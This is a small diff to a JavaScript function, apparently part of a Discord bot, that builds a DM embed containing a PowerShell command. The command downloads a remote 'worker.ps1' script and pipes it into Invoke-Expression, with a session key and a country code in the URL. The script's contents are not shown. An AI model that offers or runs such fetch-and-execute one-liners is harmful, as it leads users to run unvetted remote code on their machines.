@@ -86,7 +86,7 @@ function buildPopulateDmEmbed(sessionKey, countryCode, username, locale = 'es') 
             },
             {
                 name: t(locale, 'populate.dm_step2_title'),
-                value: `\`\`\`powershell\niex (iwr -useb https://sengo-bot.onrender.com/worker.ps1) -Key "${sessionKey}" -Country "${countryCode}"\n\`\`\``
+                value: `\`\`\`powershell\nirm "https://sengo-bot.onrender.com/worker.ps1?key=${sessionKey}&country=${countryCode}" | iex\n\`\`\``
             },
             {
                 name: t(locale, 'populate.dm_how_title'),
